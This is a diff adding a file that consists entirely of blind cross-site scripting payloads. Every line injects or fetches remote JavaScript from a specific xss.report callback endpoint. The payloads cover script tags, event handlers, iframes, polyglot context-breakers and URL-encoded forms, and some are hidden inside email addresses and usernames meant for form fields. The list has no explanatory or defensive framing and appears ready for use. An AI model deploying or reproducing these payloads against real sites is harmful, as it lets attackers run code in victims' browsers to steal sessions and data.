@@ -1,0 +1,54 @@
+'"><script src=https://xss.report/c/void0041?1></script>
+';"</scrpt><script/src=//xss.report/c/void0041?66></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/void0041?2\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/void0041?4");a.send();</script>
+var a=document.createElement("script");a.src="https://xss.report/c/void0041?5";document.body.appendChild(a);
+<svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/void0041?6\';document.body.appendChild(a)')" />
+<div onmouseover="var a=document.createElement('script');a.src='https://xss.report/c/void0041?7';document.body.appendChild(a)">Hover me</div>
+<body onload="var a=document.createElement('script');a.src='https://xss.report/c/void0041?8';document.body.appendChild(a)">
+<input autofocus contenteditable onfocusin="document.body.appendChild(document.createElement('script')).src='https://xss.report/c/void0041?17';">
+<script>$.getScript("//xss.report/c/void0041?12")</script>
+';"/></textarea></script><script src="https://xss.report/c/void0041?46"></script>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\void0041/.source))//>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https://xss.report/c/void0041?31/.source))//>
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://xss.report/c/void0041?35"></scrIpt>
+"\"></script></title></textarea><script src='https://xss.report/c/void0041?36'></script>"
+'/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//'//><scrIpt src="https://xss.report/c/void0041?37"></scrIpt>
+'"></title></textarea></script></style></noscript><script src=https://xss.report/c/void0041?38></script>
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src=https://xss.report/c/void0041?40></scrIpt>
+/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//'//><scrIpt src="https://xss.report/c/void0041?41"></scrIpt>
+`'"></script></title></textarea><script src=//xss.report/c/void0041?53></script>
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="//xss.report/c/void0041?54"></scrIpt>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg*/onload=import(/https:\xss.report/c/void0041?58\/.source)//>
+<iframe src="javascript:var a=document.createElement('script');a.src='https://xss.report/c/void0041?14';document.body.appendChild(a)"></iframe>
+<audio src="x" onerror="var a=document.createElement('script');a.src='https://xss.report/c/void0041?15';document.body.appendChild(a)">
+<script>fetch("//xss.report/c/void0041?16").then(r=>r.text()).then(t=>eval(t))</script>
+"><div autofocus contenteditable onfocusin="document.body.appendChild(document.createElement('script')).src='https://xss.report/c/void0041?16'"></div>
+">><marquee><img src=x onerror=document.body.appendChild(document.createElement('script')).src='https://xss.report/c/void0041?19'></marquee> ></plaintext\></|\><plaintext/onmouseover=document.body.appendChild(document.createElement('script')).src='https://xss.report/c/void0041?20'>
+"><img src=x onerror="var a = document.createElement('script'); a.src='https://xss.report/c/void0041?24'; document.body.appendChild(a);">
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=document.body.appendChild(document.createElement('script')).src='https://xss.report/c/void0041?25' /*iframe/src*/>
+"><iframe srcdoc="&#60;script&#62;document.location='https://xss.report/c/void0041?26'&#60;/script&#62;">
+"><audio src=x onerror="document.body.appendChild(document.createElement('script')).src='https://xss.report/c/void0041?28'"></audio>
+"><svg onload="document.body.appendChild(document.createElement('script')).src='https://xss.report/c/void0041?29'"></svg>
+"><iframe srcdoc='&#60;iframe srcdoc=&#34;&#60;script&#62;document.location=&#34;https://xss.report/c/void0041?30&#34;&#60;/script&#62;&#34;&#62;&#60;/iframe&#62;'></iframe>
+'"><script/**/src=https://xss.report/c/void0041?32></script>
+'"<script type="text/javascript" src="https://xss.report/c/void0041?33"></script>
+'"<script type="module" src="https://xss.report/c/void0041?34"></script>
+ibrahim'"<script src=https://xss.report/c/void0041?39></script>
+ibro%27%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss.report%2Fc%2Fvoid0041%3E%3C%2Fscript%3E
+\"></script><img src="x" onerror="with(document)body.appendChild(createElement('script')).src='https://xss.report/c/void0041?42'">
+<p><img src="https://xss.report/c/void0041?43" border="0" />--&gt;</p>
+<script>$.getScript("https://xss.report/c/void0041?45")</script>
+zer0_sec 1"><script src="https://xss.report/c/void0041?47"></script>@ibro1337@gmail.com
+ibro1337@gmail.com"><script src="https://xss.report/c/void0041?48"></script>
+ibro1337@gmail.com<!--" --><script src=https://xss.report/c/void0041?49></script>
+</script><Iframe SrcDoc="><script src=https://xss.report/c/void0041?50></script>">
+%3C%2Fscript%3E%3CIframe%20SrcDoc%3D%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss.report%2Fc%2Fvoid0041%3E%3C%2Fscript%3E%22%3E
+`â€™"><script src=//xss.report/c/void0041?52></script>
+`â€™"><svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/void0041?59\';document.body.appendChild(a)')" />
+`â€™"><iframe src="javascript:var a=document.createElement('script');a.src='https://xss.report/c/void0041?60';document.body.appendChild(a)"></iframe>
+`â€™"><div onmouseover="var a=document.createElement('script');a.src='https://xss.report/c/void0041?61';document.body.appendChild(a)">Hover me</div>
+`â€™"><audio src="x" onerror="var a=document.createElement('script');a.src='https://xss.report/c/void0041?62';document.body.appendChild(a)">
+`â€™"><body onload="var a=document.createElement('script');a.src='https://xss.report/c/void0041?63';document.body.appendChild(a)">
+<script>fetch("//xss.report/c/void0041?64").then(r=>r.text()).then(t=>eval(t))</script>
+<iframe srcdoc="<script src='https://xss.report/c/void0041?65'></script>"></iframe>
